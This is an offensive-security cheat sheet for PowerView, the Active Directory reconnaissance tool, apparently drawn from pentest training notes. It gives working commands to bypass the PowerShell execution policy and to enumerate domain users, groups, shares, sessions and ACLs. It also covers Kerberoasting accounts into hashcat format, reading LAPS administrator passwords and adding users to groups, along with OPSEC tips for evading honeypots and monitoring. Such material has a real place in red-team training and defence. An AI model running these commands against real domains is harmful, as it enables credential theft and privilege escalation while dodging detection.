---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PowerView

```powershell
# Execution policy bypass
powershell -ep bypass
# Import PowerView
Import-Module .\PowerView.ps1
```

## Enumeration

{% tabs %}
{% tab title="Domain Info" %}
```powershell
# Domain information
Get-Domain

# Domain SID
Get-DomainSID

# DC info
Get-DomainController
```

When forging tickets, the Kerberos-related policies are typically set to the default values by the tools (e.g. `mimikatz`, `rubeus`) automatically. If the domain has custom values, the mismatch will probably cause issues.

```powershell
# Domain policies
Get-DomainPolicyData
```
{% endtab %}

{% tab title="Users" %}
The unfiltered command will result in a massive output:

```powershell
# Domain users (all attributes)
Get-DomainUser

# List the specified attributes of all domain users
Get-DomainUser | select samaccountname

# Query about the specified user
Get-DomainUser -Identity ca_svc

# Search for a particular string in a user's attribute
Get-DomainUser -LDAPFilter "Description=*built*" | select name,description
```

The `logonCount` attribute can help in identifying honeypot or dormant accounts; make sure to not attack these as they will generate a lot of alerts:

```powershell
# Filter by logonCount
Get-DomainUser | select samaccountname,logonCount

# Enumerate honeypot accounts
Get-DomainUser | Where-Object {$_.logoncount -eq 0}

# Avoid honeypot accounts
Get-DomainUser | Where-Object {$_.logoncount -gt 0}
```
{% endtab %}

{% tab title="Hosts" %}
```powershell
# List computer objects
Get-DomainComputer

# List the specified attributes of all computer objects
Get-DomainComputer | select operatingsystem,dnshostname
```

By default, a domain user can add up to 10 domain objects. As a result, there is a good chance that not all of them are real hosts. Use `logonCount` to check:

```powershell
Get-DomainComputer | select dnshostname,logonCount
```
{% endtab %}

{% tab title="Groups" %}
{% hint style="danger" %}
**OPSEC**: Stay away from DAs â†’ the most well-protected and monitored account!
{% endhint %}

{% hint style="success" %}
When querying about `Domain Admins` members, `-500` indicates that this is the default `Administrator` account, while the `-1000`+ indicates that it is user-created.
{% endhint %}

```powershell
# Domain groups
Get-DomainGroup | select name

# Domain groups that contain "admin"
Get-DomainGroup *admin* | select name

# Group members
Get-DomainGroup 'Domain Admins' | select member
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# User memberships
Get-DomainGroup -Username "user" | select name
```

If operating from a child domain, the forest root need to be enumerated separately using `-Domain` or cross-domain trust enumeration. For instance, the `Enterprise Admins` group only exists in the forest root.

```powershell
# Domain groups in the forest root (will include Enterprise Admins)
Get-DomainGroup -Domain forestroot.local | select name
```

Querying for local groups required admin rights on non-DC machines:

```powershell
# Local groups
> Get-NetLocalGroup -ComputerName dcopr-dc

# Group members
> Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```
{% endtab %}

{% tab title="Shares" %}
```powershell
# Shares on domain hosts
Invoke-ShareFinder -Verbose
Find-DomainShare

# List all domain shares available to the current user
Find-DomainShare -CheckShareAccess

# Sensitive files on domain hosts
Invoke-FileFinder -Verbose

# All fileservers on the domain
Get-NetFileServer
```

The below command uses the NetWkstaUserEnum and NetSessionEnum Windows APIs. The former requires admin privileges, while the latter does not:

```powershell
# Active SMB sessions
Get-NetSession -ComputerName web01
```

For shares enumeration, [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares) can be used. It can discover shares, sensitive files, ACLs for shares, network hosts, identities, etc. and generates an HTML report:

{% hint style="danger" %}
**OPSEC**: Remove the DC from the `servers.txt` file.
{% endhint %}

{% code overflow="wrap" %}
```powershell
Invoke-HuntSMBShares -NoPing -OutputDirectory c:\ad\tools -HostList c:\ad\tools\servers.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Local Admin" %}
Scan the network to find out if the current user has administrative access on other computers.

```powershell
Find-LocalAdminAccess
```

> _This command uses the `OpenServiceW` function to interact with the **Service Control Manager (SCM)** on a target machine. The SCM manages installed services and drivers. PowerView tries to connect to it with `SC_MANAGER_ALL_ACCESS` permissions, which **require administrative rights**. If it success, it means the current user has **administrator privileges** on that machine._
{% endtab %}

{% tab title="Logged-In Users" %}
Quering for logged in information requires admin rights:

```powershell
# Active logged on users
Get-NetLoggedon -ComputerName dcorp-adminsrv

# Locally logged on users
Get-LoggedonLocal -ComputerName dcorp-adminsrv

# Last logged on user
Get-LastLoggedOn -ComputerName dcorp-adminsrv
```
{% endtab %}

{% tab title="ACEs" %}
```powershell
> Get-ObjectAcl -Identity stephanie
...
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
...
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
```

The output contains two SIDs that represent objects in AD. We can convert those into a readable domain object name.&#x20;

> The `ActiveDirectoryRights` property describes the type of permission applied to the object. The `SecurityIdentifier` tells us who has the `ReadProperty` permission. In this case, the `RAS and IAS Servers` group has `ReadProperty` access rights to the `stephanie` user.

```powershell
> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers
```
{% endtab %}

{% tab title="ACLs" %}
{% code overflow="wrap" %}
```powershell
# find user's SID
$sid = Convert-NameToSid <USER>
# search for all domain objects that the user has rights over
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? ($_.SecurityIdentifier -eq $sid)
```
{% endcode %}

The `ObjectAceType` fields tells us what ACE the user has over the object.

<figure><img src="../../../.gitbook/assets/pv_objectacetype.png" alt=""><figcaption></figcaption></figure>

In case the script cannot be used, we can use native cmdlets. To convert the GUID into a human-readable format we can either perform a reverse search as shown below, or just google the GUID.

{% code overflow="wrap" %}
```powershell
# make a list of all domain users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
# retrieve ACL information about the target user
foreach($line in [System.IO.File]::ReadLines("C:\Windows\Temp\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<DOMAIN>\\<USER>'}}
# convert GUID into a human-readable format
$guid= "00299570-246d-11d0-a768-00aa006e0529"
# reverse search to map the name to GUID
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```
{% endcode %}
{% endtab %}

{% tab title="Permissions" %}
{% code overflow="wrap" %}
```powershell
# List all objects for which the current user has the specified permission
> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier, ActiveDirectoryRights

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
S-1-5-32-548                                             GenericAll
S-1-5-18                                                 GenericAll
S-1-5-21-1987370270-658905905-1781884369-519             GenericAll

# Convert SIDs to a readable format
> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Attacks

### Kerberoasting

For Kerberoasting see [here](../attacks/kerberoasting.md#attack).

### Password Change

For changing the password of an account see [here](../permissions/forcechangepassword.md).

### LAPS Password

For changing the LAPS password see here.

{% tabs %}
{% tab title="Kerberoasting" %}
{% code overflow="wrap" %}
```powershell
# Enumerate Kerberoastable accounts
Get-DomainUser * -SPN | select samaccountname
# Kerberoast the enumerated accounts
Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```
{% endcode %}
{% endtab %}

{% tab title="LAPS Password" %}
{% code overflow="wrap" %}
```powershell
Get-DomainComputer "MachineName" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Python Version

[PowerView.py](https://github.com/aniqfakhrul/powerview.py) is an alternative for the original [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) script. Its main goal is to achieve interactive session without having to repeatedly authenticate to ldap.

{% tabs %}
{% tab title="Connect" %}
```bash
powerview <domain>/<user>:'<pass>'@<domain> -k
```
{% endtab %}

{% tab title="Group Membership" %}
Add a user to a group:

```bash
# Add user to the group
PV > Add-DomainGroupMember -Identity <group> -Members <user>

# Confirm group membership
PV > Get-DomainGroupMember -Identity <group>
```
{% endtab %}

{% tab title="ACLs" %}
Check object's ACL:

{% code overflow="wrap" %}
```bash
# check rights of oorend over winrm_svc
Get-DomainObjectAcl -Identity winrm_svc -Where "SecurityIdentifier contains oorend"
```
{% endcode %}
{% endtab %}
{% endtabs %}
